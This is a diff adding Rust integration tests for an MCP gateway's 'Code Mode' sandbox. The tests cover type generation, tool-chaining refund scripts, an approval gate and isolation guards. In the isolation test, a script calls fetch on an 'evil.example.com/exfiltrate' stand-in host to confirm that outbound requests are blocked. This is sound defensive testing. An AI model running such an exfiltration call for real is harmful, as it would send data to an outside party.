@@ -6,9 +6,9 @@ use omni_mcp::control_plane::{
     AutoCrawler, IDLParser, MCPFxHeartbeatMonitor, MCPRegistry, ThirdPartyAuthExchange,
 };
 use omni_mcp::data_plane::{
-    CircuitBreakerRegistry, CircuitState, InMemoryConfigCache, MCPProxyGateway, MuttleyMeshClient,
-    PIIRedactor, ProtocolTranslator, RateLimiter, ResponseProjectionEngine, SecurityCharterEngine,
-    SemanticResponseCache,
+    CircuitBreakerRegistry, CircuitState, CodeModeTypeGenerator, InMemoryConfigCache,
+    MCPProxyGateway, MuttleyMeshClient, PIIRedactor, ProtocolTranslator, RateLimiter,
+    ResponseProjectionEngine, SandboxLimits, SecurityCharterEngine, SemanticResponseCache,
 };
 use omni_mcp::extension::{AifxCLI, OmniMCPServer};
 use omni_mcp::json;
@@ -1007,6 +1007,221 @@ fn test_v3_autonomous_planning_diagnostics_and_mcp_resources() {
     assert_eq!(audit_status, 200);
     let audit_json = JsonValue::parse(&String::from_utf8(audit_body).unwrap()).unwrap();
     assert_eq!(audit_json["verified"].as_bool(), Some(true));
+
+    ctx.store.close();
+    let _ = fs::remove_dir_all(&dir);
+}
+
+#[test]
+fn test_v4_codemode_typescript_declaration_generation_and_token_compression() {
+    let dir = temp_test_path("omni_codemode_types_test");
+    let mut cfg = OmniConfig::default();
+    cfg.data_dir = dir.clone();
+    let ctx = ProductionGatewayContext::new(Some(cfg));
+
+    // 1. Generate TypeScript declarations across all enabled servers
+    let ts_res = ctx.gateway.generate_codemode_types(None, None);
+    assert!(ts_res.typescript_declarations.contains("declare namespace codemode {"));
+    assert!(ts_res.typescript_declarations.contains("namespace uber_rides {"));
+    assert!(ts_res.typescript_declarations.contains("function list_recent(input: { user_id: string }): Promise<any>;"));
+    assert!(ts_res.typescript_declarations.contains("namespace accounting {"));
+    assert!(ts_res.typescript_declarations.contains("[MUTATION]"));
+    assert!(ts_res.typescript_declarations.contains("function refund("));
+    assert!(ts_res.token_savings_pct > 50.0);
+
+    // 2. Test {{types}} prompt template injection
+    let template = "Use the following TypeScript APIs:\n```ts\n{{types}}\n```";
+    let injected = CodeModeTypeGenerator::inject_types_template(template, &ts_res.typescript_declarations);
+    assert!(injected.contains("declare namespace codemode"));
+    assert!(!injected.contains("{{types}}"));
+
+    // 3. Verify `tools/list` on OmniMCPServer dynamically injects {{types}} into `codemode` description
+    let list_req = RPCRequest::new(4001i64, "tools/list", json!({}));
+    let list_resp = ctx.omni_mcp.handle_request(&list_req, "agent", None);
+    let tools = list_resp.result.unwrap()["tools"].as_array().unwrap().clone();
+    let codemode_tool = tools
+        .iter()
+        .find(|t| t["name"].as_str() == Some("codemode"))
+        .expect("codemode tool must be exposed");
+    assert!(codemode_tool["description"]
+        .as_str()
+        .unwrap()
+        .contains("declare namespace codemode"));
+
+    ctx.store.close();
+    let _ = fs::remove_dir_all(&dir);
+}
+
+#[test]
+fn test_v4_codemode_js_ts_and_rhai_multi_tool_chaining_with_console_logs() {
+    let dir = temp_test_path("omni_codemode_exec_test");
+    let mut cfg = OmniConfig::default();
+    cfg.data_dir = dir.clone();
+    let ctx = ProductionGatewayContext::new(Some(cfg));
+
+    // 1. Cloudflare Code Mode JS/TS async script with console.log and multi-tool chaining
+    let js_script = r#"
+    async () => {
+        const rides = await codemode.uber_rides.list_recent({ user_id: "usr_456" });
+        console.log("Fetched rides:", rides.length);
+        const eligible = rides.filter(r => r.status === "cancelled" && r.amount > 20.0);
+        let total_refund = 0.0;
+        let count = 0;
+        for (const ride of eligible) {
+            await codemode.accounting.refund({ ride_id: ride.id, reason: "Auto refund via Code Mode" });
+            console.log("Refunded ride:", ride.id);
+            total_refund += ride.amount;
+            count += 1;
+        }
+        return { refunded_count: count, total_amount: total_refund };
+    }
+    "#;
+
+    let out_js = ctx.gateway.execute_codemode(
+        js_script,
+        None,
+        false,
+        "agent",
+        Some("uber_token_1"),
+        None,
+    );
+    assert_eq!(out_js.status, "OK", "JS error: {:?}", out_js.error);
+    assert_eq!(out_js.result["refunded_count"].as_i64(), Some(2));
+    assert_eq!(out_js.result["total_amount"].as_f64(), Some(72.5));
+    assert_eq!(out_js.tool_calls, 3);
+    assert_eq!(out_js.logs.len(), 3);
+    assert!(out_js.logs[0].contains("Fetched rides: 4"));
+    assert!(out_js.logs[1].contains("Refunded ride: ride_102"));
+    assert!((out_js.boot_parse_us + out_js.eval_us) < 20_000); // Fast in-process execution
+
+    // 2. Rust/Rhai syntax equivalent
+    let rhai_script = r#"
+    let rides = uber_rides::list_recent("usr_456");
+    let total_refund = 0.0;
+    let count = 0;
+    for ride in rides {
+        if ride.status == "cancelled" && ride.amount > 20.0 {
+            accounting::refund(ride.id, "Auto refund via agent");
+            total_refund += ride.amount;
+            count += 1;
+        }
+    }
+    #{ refunded_count: count, total_amount: total_refund }
+    "#;
+
+    let out_rhai = ctx.gateway.execute_codemode(
+        rhai_script,
+        None,
+        false,
+        "agent",
+        Some("uber_token_1"),
+        None,
+    );
+    assert_eq!(out_rhai.status, "OK", "Rhai error: {:?}", out_rhai.error);
+    assert_eq!(out_rhai.result["refunded_count"].as_i64(), Some(2));
+    assert_eq!(out_rhai.result["total_amount"].as_f64(), Some(72.5));
+
+    ctx.store.close();
+    let _ = fs::remove_dir_all(&dir);
+}
+
+#[test]
+fn test_v4_codemode_search_and_execute_plus_mutation_approval_gate() {
+    let dir = temp_test_path("omni_codemode_approval_test");
+    let mut cfg = OmniConfig::default();
+    cfg.data_dir = dir.clone();
+    let ctx = ProductionGatewayContext::new(Some(cfg));
+
+    // 1. In-sandbox `codemode.search()` and `codemode.describe()` (Search & Execute pattern)
+    let search_script = r#"
+    async () => {
+        const matches = await codemode.search("refund");
+        const dts = await codemode.describe("accounting");
+        return { match_count: matches.length, has_dts: dts.includes("function refund") };
+    }
+    "#;
+    let search_out = ctx.gateway.execute_codemode(search_script, None, false, "agent", None, None);
+    assert_eq!(search_out.status, "OK");
+    assert!(search_out.result["match_count"].as_i64().unwrap_or(0) >= 1);
+    assert_eq!(search_out.result["has_dts"].as_bool(), Some(true));
+
+    // 2. Human-in-the-loop Mutation Approval Gate (`require_mutation_approval: true`)
+    let mut_script = r#"
+    async () => {
+        const rides = await codemode.uber_rides.list_recent({ user_id: "usr_456" });
+        console.log("Loaded rides before mutation");
+        await codemode.accounting.refund({ ride_id: rides[1].id, reason: "Needs human approval" });
+        return { done: true };
+    }
+    "#;
+    let approval_out = ctx.gateway.execute_codemode(
+        mut_script,
+        None,
+        true, // require_mutation_approval = true
+        "agent",
+        None,
+        None,
+    );
+    assert_eq!(approval_out.status, "APPROVAL_REQUIRED");
+    assert_eq!(approval_out.logs.len(), 1);
+    assert_eq!(approval_out.pending_approvals.len(), 1);
+    assert_eq!(approval_out.pending_approvals[0].server_name, "accounting");
+    assert_eq!(approval_out.pending_approvals[0].tool_name, "refund");
+
+    ctx.store.close();
+    let _ = fs::remove_dir_all(&dir);
+}
+
+#[test]
+fn test_v4_codemode_zero_outbound_isolation_and_fuel_guardrails() {
+    let dir = temp_test_path("omni_codemode_security_test");
+    let mut cfg = OmniConfig::default();
+    cfg.data_dir = dir.clone();
+    let ctx = ProductionGatewayContext::new(Some(cfg));
+
+    // 1. Verify `globalOutbound: null` blocks direct `fetch()`
+    let outbound_script = r#"
+    async () => {
+        const res = await fetch("https://evil.example.com/exfiltrate");
+        return res;
+    }
+    "#;
+    let out_blocked = ctx.gateway.execute_codemode(outbound_script, None, false, "agent", None, None);
+    assert_eq!(out_blocked.status, "ERROR");
+    assert!(out_blocked
+        .error
+        .as_deref()
+        .unwrap_or("")
+        .contains("GlobalOutboundBlocked"));
+
+    // 2. Verify Fuel Metering terminates infinite loops (`while (true) {}`) deterministically
+    let mut strict_limits = SandboxLimits::default();
+    strict_limits.max_operations = 500;
+    let inf_loop = r#"
+    let i = 0;
+    while (true) {
+        i += 1;
+    }
+    "#;
+    let out_fuel = ctx.gateway.execute_codemode(
+        inf_loop,
+        Some(strict_limits),
+        false,
+        "agent",
+        None,
+        None,
+    );
+    assert_eq!(out_fuel.status, "ERROR");
+    assert!(out_fuel
+        .error
+        .as_deref()
+        .unwrap_or("")
+        .contains("FuelExhausted"));
+
+    // 3. Verify SHA-256 Merkle Audit Chain recorded all Code Mode executions
+    let (verified, count) = ctx.audit_store.verify_chain();
+    assert!(verified);
+    assert!(count >= 2);
 
     ctx.store.close();
     let _ = fs::remove_dir_all(&dir);
